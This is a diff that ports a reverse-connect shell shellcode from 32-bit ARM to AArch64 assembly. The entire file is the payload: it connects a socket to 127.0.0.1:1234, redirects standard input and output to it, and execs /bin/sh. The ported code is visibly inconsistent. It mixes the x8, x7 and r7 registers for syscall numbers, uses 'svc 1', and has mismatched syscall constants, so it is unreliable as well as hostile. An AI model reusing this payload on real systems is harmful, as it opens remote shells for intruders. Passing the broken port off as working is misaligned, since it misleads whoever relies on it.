@@ -1,6 +1,6 @@
 /**
   reverse connect shell to 127.0.0.1:1234
-  tested with linux running on raspberry pi 3  
+  tested with linux running on ubuntu
   
   http://modexp.wordpress.com/   
 */
@@ -10,44 +10,40 @@
 
 _start:
     // s = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
-    eor    r2, r2, r2  // r2 = IPPROTO_IP
-    mov    r1, #1      // r1 = SOCK_STREAM
-    mov    r0, #2      // r0 = AF_INET
-    lsl    r7, r1, #8  // multiply by 256
-    add    r7, #25     // 256+25 = socket
+    eor    x2, x2, x2  // x2 = IPPROTO_IP
+    mov    x1, #1      // x1 = SOCK_STREAM
+    mov    x0, #2      // x0 = AF_INET
+    mov    x8, #198    // x8 = socket call
     svc    1
   
     // connect(s, &sa, sizeof(sa));
-    mov    r6, r0       // r6 = s
-    adr    r1, sin_port // r1 = sa.sin_port
-    mov    r2, #16      // r2 = sizeof(sa)
-    add    r7, #2       // r7 = 281+2 = connect
+    mov    x6, x0       // x6 = s
+    adr    x1, sin_port // x1 = sa.sin_port
+    mov    x2, #16      // x2 = sizeof(sa)
+    add    x7, #2       // x7 = 200 = connect
     svc    1
   
-    // dup(s, FILENO_STDIN);
-    // dup(s, FILENO_STDOUT);
-    // dup(s, FILENO_STDERR);
-    mov    r1, #2      // for 3 descriptors
+    // dup2(s, FILENO_STDIN);
+    // dup2(s, FILENO_STDOUT);
+    // dup2(s, FILENO_STDERR);
+    mov    x1, #2        // for 3 descriptors
 dup_loop:
-    mov    r7, #63     // r7 = dup 
-    mov    r0, r6      // r0 = s
+    mov    x7, #24       // x7 = dup2 
+    mov    x0, x6        // x0 = s
     svc    1
-    sub    r1, #1      // 
+    sub    x1, x1, #1    // 
     bpl    dup_loop
 
     // execve("/bin/sh", NULL, NULL);
-    adr    r0, sh        // r0 = "/bin/sh" 
-    // umull r1, r2, r0, r0
-    eor    r2, r2, r2    // r2 = NULL
-    eor    r1, r1, r1    // r1 = NULL
-    strb   r2, [r0, #7]  // add null terminator    
-    mov    r7, #11       // r7 = execve
+    adr    x0, sh        // x0 = "/bin/sh" 
+    eor    x2, x2, x2    // x2 = NULL
+    eor    x1, x1, x1    // x1 = NULL  
+    mov    r7, #11       // x7 = execve
     svc    1
-    nop                  // alignment by 4 bytes
 sin_port:    
     .word  0xd2040002    // 1234, AF_INET
 sin_addr:
     .word  0x0100007f    // 127.0.0.1
 sh:  
-    .ascii "/bin/shX"
+    .ascii "/bin/sh\0"
 
